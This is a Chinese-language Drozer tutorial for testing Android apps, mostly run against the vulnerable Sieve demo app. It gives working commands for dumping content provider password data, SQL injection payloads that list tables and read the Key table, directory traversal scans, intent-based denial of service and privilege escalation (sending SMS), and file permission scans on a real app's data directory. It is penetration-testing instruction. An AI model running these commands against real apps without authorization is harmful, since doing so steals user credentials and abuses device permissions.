一、安装与启动    
　　1. 安装    
　　第一步：从http://mwr.to/drozer下载Drozer (Windows Installer)    
　　第二步：在Android设备中安装agent.apk    
　　adb install agent.apk    
　　2. 启动    
　　第一步：在PC上使用adb进行端口转发，转发到Drozer使用的端口31415    
　　adb forward tcp:31415 tcp:31415  
　　第二步：在Android设备上开启Drozer Agent   
　　选择embedded server-enable  
　　第三步：在PC上开启Drozer console   
　　drozer console connect  
　　二、测试步骤  
　　1.获取包名  
　　dz> run app.package.list -f sieve   
　　com.mwr.example.sieve   
　　2.获取应用的基本信息   
　　run app.package.info -a com.mwr.example.sieve   
　　3.确定攻击面   
　　run app.package.attacksurface com.mwr.example.sieve   
　　4.Activity   
　　（1）获取activity信息   
　　run app.activity.info -a com.mwr.example.sieve   
　　（2）启动activity   
　　run app.activity.start --component com.mwr.example.sieve   
　　dz> help app.activity.start   
　　usage: run app.activity.start [-h] [--action ACTION] [--category CATEGORY]   
　　[--component PACKAGE COMPONENT] [--data-uri DATA_URI]   
　　[--extra TYPE KEY VALUE] [--flags FLAGS [FLAGS ...]]   
　　[--mimetype MIMETYPE]   
　　5.Content Provider    
　　（1）获取Content Provider信息    
　　run app.provider.info -a com.mwr.example.sieve   
　　（2）Content Providers（数据泄露） 
　　先获取所有可以访问的Uri：   
　　run scanner.provider.finduris -a com.mwr.example.sieve   
　　获取各个Uri的数据：   
　　run app.provider.query    
　　content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical   
　　查询到数据说明存在漏洞   
　　（3）Content Providers（SQL注入）    
　　`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'" `   
　　`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"  `  
　　报错则说明存在SQL注入。   
　　列出所有表：   
　　run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"    
　　获取某个表（如Key）中的数据：  
　　run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"  
　　（4）同时检测SQL注入和目录遍历  
　　run scanner.provider.injection -a com.mwr.example.sieve  
　　run scanner.provider.traversal -a com.mwr.example.sieve  
　　6 intent组件触发（拒绝服务、权限提升）  
　　利用intent对组件的触发一般有两类漏洞，一类是拒绝服务，一类的权限提升。拒绝服务危害性比较低，更多的只是影响应用服务质量；而权限提升将使得没有该权限的应用可以通过intent触发拥有该权限的应用，从而帮助其完成越权行为。  
　　1.查看暴露的广播组件信息：   
　　run app.broadcast.info -a com.package.name　　获取broadcast receivers信息   
　　run app.broadcast.send --component 包名 --action android.intent.action.XXX   
　　2.尝试拒绝服务攻击检测，向广播组件发送不完整intent（空action或空extras）：  
　　run app.broadcast.send 通过intent发送broadcast receiver  
　　(1)   空action  
　　run app.broadcast.send --component 包名 ReceiverName   
　　run app.broadcast.send --component 包名 ReceiverName   
　　(2)   空extras   
　　run app.broadcast.send --action android.intent.action.XXX   
　　3.尝试权限提升  
　　权限提升其实和拒绝服务很类似，只不过目的变成构造更为完整、更能满足程序逻辑的intent。由于activity一般多于用户交互有关，所以基 于intent的权限提升更多针对broadcast receiver和service。与drozer相关的权限提升工具，可以参考IntentFuzzer，其结合了drozer以及hook技术，采用 feedback策略进行fuzzing。以下仅仅列举drozer发送intent的命令：  
　　（1）获取service详情  
　　run app.service.info -a com.mwr.example.sieve  
　　不使用drozer启动service   
　　am startservice –n 包名/service名   
　　（2）权限提升  
　　run app.service.start --action com.test.vulnerability.SEND_SMS --extra string dest 11111 --extra string text 1111 --extra string OP SEND_SMS   
　　7.文件操作  
　　列出指定文件路径里全局可写/可读的文件  
　　run scanner.misc.writablefiles --privileged /data/data/com.sina.weibo  
　　run scanner.misc.readablefiles --privileged /data/data/com.sina.weibo   
　　run app.broadcast.send --component 包名 --action android.intent.action.XXX  
　　8.其它模块  
　　shell.start 在设备上开启一个交互shell  
　　tools.file.upload / tools.file.download 上传/下载文件到设备  
　　tools.setup.busybox / tools.setup.minimalsu 安装可用的二进制文件  
